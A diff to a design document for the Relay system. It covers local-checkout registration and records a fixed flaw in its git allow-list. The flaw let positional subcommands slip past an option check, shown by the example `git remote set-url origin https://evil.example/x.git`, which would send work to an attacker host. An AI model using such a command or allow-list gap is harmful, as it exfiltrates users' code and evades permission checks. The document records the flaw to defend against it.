@@ -450,8 +450,33 @@ reads as unfinished.
    a protected branch, and `pushLanded` compares the OBSERVED tip with what
    Relay committed — an unreported tip is unknown, not agreement.
 
-   **A GAP THE WIRING EXPOSED, recorded because it is not obvious.** No single
-   valid registration can reach this leg end to end today. A `github` identity
+   **THAT GAP IS NOW CLOSED.** A remote-hosted repository may name a LOCAL
+   CHECKOUT — the ordinary case, a GitHub repository already cloned on the
+   machine, edited in an isolated worktree and pushed to its own remote. The old
+   rule forced a `github` identity to be `remote_clone`, and `remote_clone` is
+   refused because nothing clones, so PUSH/PR/MERGE was wired and unreachable.
+
+   The blanket refusal is replaced by an actual comparison, which is STRONGER:
+   `checkoutMatchesIdentity` READS the checkout's own `origin` and refuses
+   unless it names this exact repository, comparing owner/name rather than the
+   URL string so the https, no-suffix and ssh spellings of one repository are
+   all accepted. Without it a registration could name
+   `github.com/acme/production` and a path of `/home/me/scratch`, and Relay
+   would commit scratch work and push it to production. The old rule prevented
+   that by forbidding every local path, including the correct ones.
+
+   **A SECURITY HOLE THIS OPENED AND CLOSED, recorded because the mechanism
+   generalises.** Reading `origin` needed `remote` on the git allow-list. The
+   options allow-list only inspects DASH-PREFIXED arguments, so a subcommand
+   whose operation is a positional word bypasses it completely: with `remote`
+   permitted and `get-url` listed as its only "option",
+   `git remote set-url origin https://evil.example/x.git` was ACCEPTED. A
+   Mission that can repoint origin can push a founder's work anywhere. Found by
+   probing the built function rather than by reading it. `GIT_SUBCOMMAND_VERBS`
+   now polices the first positional, and every mutating verb is refused by name.
+
+   Superseded text, kept because this document's corrections stay visible: no
+   single valid registration could reach this leg end to end. A `github` identity
    MUST be `remote_clone` (the domain refuses otherwise), and
    `repository-source.ts` REFUSES `remote_clone` because nothing clones — so a
    target that can be sourced for the coding leg cannot carry the owner/name the
